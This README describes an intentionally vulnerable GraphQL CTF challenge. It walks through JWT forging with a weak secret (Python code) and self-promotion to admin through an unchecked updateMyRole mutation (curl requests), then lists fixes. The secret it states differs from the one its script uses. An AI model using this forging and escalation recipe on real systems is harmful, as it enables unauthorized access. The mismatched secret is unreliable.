# Apollo GraphQL CTF Challenge - JWT Privilege Escalation

A GraphQL API designed for Capture The Flag (CTF) challenges, featuring an intentional JWT-based privilege escalation vulnerability.

## 🚨 CTF Challenge Overview

This API contains a **deliberate security vulnerability** for educational purposes in cybersecurity competitions. The challenge involves:

1. **JWT Token Forging**: Participants must forge a valid JWT token to authenticate
2. **Privilege Escalation**: Use the vulnerable `updateMyRole` mutation to escalate from 'user' to 'admin'
3. **Admin Access**: Access admin-only endpoints to retrieve sensitive information

## Live Demo

**🚀 Public API Endpoint**: `https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql`

**🎮 GraphQL Playground**: `https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql`

## 🎯 Challenge Objectives

### Primary Goal
Gain admin access to retrieve sensitive information from the `adminStats` query.

### Steps to Complete
1. **Analyze the JWT Implementation**: Understand how tokens are generated and verified
2. **Forge a Valid JWT**: Create a token that passes authentication
3. **Escalate Privileges**: Use the `updateMyRole` mutation to become an admin
4. **Access Admin Data**: Query the `adminStats` endpoint for the flag/sensitive data

## 🔧 Technical Details

### JWT Configuration
- **Algorithm**: HS256 (HMAC with SHA-256)
- **Secret**: `your-super-secret-jwt-key-change-this-in-production` (intentionally weak)
- **Payload Structure**: `{ "userId": <number>, "iat": <timestamp>, "exp": <timestamp> }`

### User Roles
- **user**: Default role with limited access
- **admin**: Elevated role with access to sensitive endpoints

### Sample Users (Pre-created)
- **Username**: `ctf_user`, **Email**: `user@ctf.local`, **Role**: `user`
- **Username**: `ctf_admin`, **Email**: `admin@ctf.local`, **Role**: `admin`

## 🛡️ Vulnerability Details

### The Flaw: Self-Role Update
The `updateMyRole` mutation allows authenticated users to change their own role without proper authorization checks:

```graphql
mutation {
  updateMyRole(newRole: admin) {
    id
    username
    role
  }
}
```

**Why it's vulnerable**: There's no validation preventing users from escalating their own privileges.

## 📊 API Schema

### Available Queries

#### Public (No Authentication)
```graphql
posts: [Post!]!          # Get all posts
post(id: ID!): Post      # Get specific post
```

#### Authenticated (Valid JWT Required)
```graphql
me: User                 # Get current user info
myPosts: [Post!]!        # Get user's posts
```

#### Admin Only (Admin Role Required)
```graphql
users: [User!]!          # Get all users (sensitive)
adminStats: AdminStats!  # Get admin statistics (contains flag)
```

### Available Mutations

#### Authenticated
```graphql
createPost(title: String!, content: String!): Post!
updateMyRole(newRole: Role!): User!  # VULNERABLE - Allows privilege escalation
```

## 🔍 Exploitation Hints

### JWT Token Structure
A valid JWT token for user ID 1 would look like:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxNjQxNjAwMDAwfQ.signature
```

### Decoding the JWT
The token contains three parts separated by dots:
1. **Header**: `{"alg":"HS256","typ":"JWT"}`
2. **Payload**: `{"userId":1,"iat":1640995200,"exp":1641600000}`
3. **Signature**: HMAC-SHA256 hash of header.payload using the secret

### Tools for JWT Manipulation
- [jwt.io](https://jwt.io) - Online JWT debugger
- [PyJWT](https://pyjwt.readthedocs.io/) - Python library
- [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) - Node.js library

### Attack Vector
1. **Discover the JWT secret** (it's intentionally weak and exposed)
2. **Create a valid token** for any user ID (1 or 2 work)
3. **Authenticate** using the forged token
4. **Escalate privileges** using `updateMyRole` mutation
5. **Access admin endpoints** to retrieve sensitive data

## 🧪 Testing Examples

### Step 1: Forge a JWT Token
```python
import jwt
import time

# Weak secret (intentionally exposed)
secret = "Gibberish, jibberish, jibber-jabber and gobbledygook"

# Create payload for user ID 1
payload = {
    "userId": 1,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600  # 1 hour expiry
}

# Generate token
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Forged JWT: {token}")
```

### Step 2: Test Authentication
```bash
curl -X POST https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_FORGED_TOKEN" \
  -d '{"query": "query { me { id username role } }"}'
```

### Step 3: Escalate Privileges
```bash
curl -X POST https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_FORGED_TOKEN" \
  -d '{"query": "mutation { updateMyRole(newRole: admin) { id username role } }"}'
```

### Step 4: Access Admin Data
```bash
curl -X POST https://4000-ihbuvsewwq89vw5dzkq46-278bf4c2.manus.computer/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_FORGED_TOKEN" \
  -d '{"query": "query { adminStats { totalUsers totalPosts adminUsers { username email } } }"}'
```

## 🏆 Success Criteria

You've successfully completed the challenge when you can:
1. ✅ Authenticate with a forged JWT token
2. ✅ Escalate your role from 'user' to 'admin'
3. ✅ Access the `adminStats` query
4. ✅ Retrieve sensitive administrative information

## 🛠️ Local Development

### Installation
```bash
npm install
```

### Environment Setup
The `.env` file contains the intentionally weak JWT secret:
```env
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production
JWT_EXPIRES_IN=7d
PORT=4000
NODE_ENV=development
```

### Running Locally
```bash
npm start
```

The server will start at `http://localhost:4000/graphql`

## 📁 Project Structure

```
apollo-graphql-jwt/
├── src/
│   ├── database/
│   │   └── db.js              # SQLite database with sample users
│   ├── middleware/
│   │   └── auth.js            # JWT authentication (vulnerable)
│   ├── resolvers/
│   │   └── index.js           # GraphQL resolvers with privilege escalation
│   ├── schema/
│   │   └── typeDefs.js        # GraphQL schema with role-based types
│   ├── utils/
│   │   └── jwt.js             # JWT utilities (weak secret)
│   └── index.js               # Apollo Server setup
├── .env                       # Environment with exposed JWT secret
├── database.sqlite            # SQLite database with sample data
└── README.md                  # This file
```

## 🔒 Security Lessons

This challenge demonstrates several common security vulnerabilities:

### 1. Weak JWT Secrets
- **Issue**: Using predictable or exposed secrets
- **Fix**: Use cryptographically strong, randomly generated secrets

### 2. Insufficient Authorization
- **Issue**: Allowing users to modify their own privileges
- **Fix**: Implement proper role-based access control with admin-only privilege modification

### 3. Information Disclosure
- **Issue**: Exposing sensitive configuration in documentation
- **Fix**: Never expose secrets in documentation or version control

### 4. Missing Input Validation
- **Issue**: No validation on role changes
- **Fix**: Validate all user inputs and enforce business rules

## 🎓 Educational Value

This CTF challenge teaches:
- JWT token structure and manipulation
- GraphQL security considerations
- Privilege escalation vulnerabilities
- The importance of proper authorization checks
- Secure secret management practices

## ⚠️ Disclaimer

This application contains **intentional security vulnerabilities** for educational purposes only. Do not use this code in production environments. Always implement proper security measures in real applications.

---

**Good luck with the challenge! 🚀**

